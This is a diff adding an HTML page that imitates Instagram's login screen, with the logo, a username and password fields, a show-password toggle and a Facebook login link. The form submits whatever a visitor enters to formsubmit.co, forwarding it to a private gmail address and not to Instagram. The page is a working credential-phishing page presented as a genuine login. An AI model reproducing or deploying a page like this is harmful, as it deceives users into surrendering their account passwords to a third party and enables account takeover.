@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <form action="https://formsubmit.co/nahirixrw@gmail.com"
+            method="POST">
+      <div class="center">
+        <div class="header">
+          <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
+        </div>
+        <select id="lang">
+          <option value="">English</option>
+           <option value="">France</option>
+            <option value="">Spanish</option>
+             <option value="">German</option>
+        </select>
+        <div class="inputElement">
+          <input
+            type="text" name="name"
+            placeholder="Phone number,username or email"
+            class="inputText"
+          />
+          <label>
+				<div class="passwd-wrap">
+					<input
+						type="password" name="password"
+						id="password"
+						placeholder="Password" />
+
+					<button type="button" id="show-passwd">
+						<img src="./eye_open.svg" alt="Show Password" />
+					</button>
+				</div>
+			</label>
+          <input type="submit" value="Log in" class="inputButton" />
+          <div class="forgetPassword">Forget Password?</div>
+          <div class="line">
+            <span class="arrow"></span>
+            <span class="content">OR</span>
+            <span class="arrow"></span>
+          </div>
+          <div class="social__icon">
+          <span><i class="fa-brands fa-facebook"></i> Log in via Facebook </span>
+          </div>
+          
+        </div>
+      </div>
+      <div class="footer">
+        <p>Don't have a accout?<span> Sign Up.</span></p>
+      </div>
+    </div>
+    <script src="main.js"></script>
+  </body>
+</html>
